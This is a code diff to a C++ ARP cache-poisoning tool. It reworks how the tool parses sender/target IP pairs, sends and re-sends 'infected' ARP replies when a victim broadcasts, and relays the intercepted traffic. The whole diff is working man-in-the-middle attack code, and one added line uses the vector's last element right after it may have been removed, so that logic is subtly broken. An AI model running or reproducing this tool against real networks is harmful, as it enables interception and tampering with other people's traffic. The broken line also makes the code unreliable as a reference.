@@ -13,7 +13,6 @@ private :
     char *interface;
     ReceivedPacket& receivedPacket = ReceivedPacket::getInstance();
     vector<AttackPacket> attacks;
-    vector<thread> threads;
     pcap_t *handle;
     shared_ptr<ObserveQueue> observer;
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -30,18 +29,24 @@ public :
     }
 
     void init(int argc, char *argv[], pcap_t *handle) {
-        int do_count = int((argc - 1) / 2);
-        interface = argv[0];
-
+        int do_count = (argc - 2) / 2;
+        interface = argv[1];
+        this->handle = handle;
         for (int i = 0; i < do_count; i++) {
-            attacks.push_back(AttackPacket(interface, handle, Ip(argv[i*2+1]), Ip(argv[(i+1)*2])));
-            attacks.at(i).set_attack_packet();
-            attacks.at(i).send_my_packet();
-            cout << "[*] Send first attack packet (" << attacks.at(i).senderIp << ") (" << attacks.at(i).targetIp << ")" << endl;
+            Ip senderIp(argv[2 + i*2]);
+            Ip targetIp(argv[3 + i*2]);
+
+            attacks.push_back(AttackPacket(interface, handle, senderIp, targetIp));
+            if (!attacks.back().is_ready) attacks.pop_back();
+            attacks.back().set_attack_packet();
+            attacks.back().send_my_packet();
+
+            cout << "[*] Send first attack packet (" << string(senderIp) << ") (" << string(targetIp) << ")" << endl;
         }
         observer = std::make_shared<ObserveQueue>();
         receivedPacket.attach(static_pointer_cast<Observer>(observer));
     }
+
 
     void start_receive() {
         receivedPacket.receive_start(handle);
@@ -50,26 +55,25 @@ public :
     void arp_infection_packet_send(EthArpPacket& packet) {
         for (AttackPacket attack : attacks) {
             if (attack.is_broadcast_from_sender(packet)) {
-                cout << "[*] Arp Broadcase packet is Detected from " << packet.arp_.sip() << endl;
+                cout << "[*] Arp Broadcase packet is Detected from " << string(packet.arp_.sip()) << endl;
                 attack.set_attack_packet();
                 attack.send_my_packet();
-                cout << "[*] Resend infected Arp Packet to " << packet.arp_.sip() << endl;
+                cout << "[*] Resend infected Arp Packet to " << string(packet.arp_.sip()) << endl;
                 return ;
             }
         }
-        cout << "[*] Unknown arp packet is detected from " << packet.arp_.sip() << endl;
+        cout << "[*] Unknown arp packet is detected from " << string(packet.arp_.sip()) << endl;
     }
 
     void relay_packet_send(vector<u_char>& packet) {
         EthHdr *ethhdr = reinterpret_cast<EthHdr *>(packet.data());
         for (AttackPacket attack : attacks) {
             if (ethhdr->smac() == attack.senderMac) {
-                cout << "[*] Normal Packet is detected from " << attack.senderIp << endl;
+                cout << "[*] Normal Packet is detected from " << string(attack.senderIp) << endl;
                 attack.relay_send(packet);
-                cout << "[*] Relay Packet to " << attack.targetIp << endl;
+                cout << "[*] Relay Packet to " << string(attack.targetIp) << endl;
             }
         }
-        cout << "[*] Unkown packet Detected" << endl;
     }
 };
 
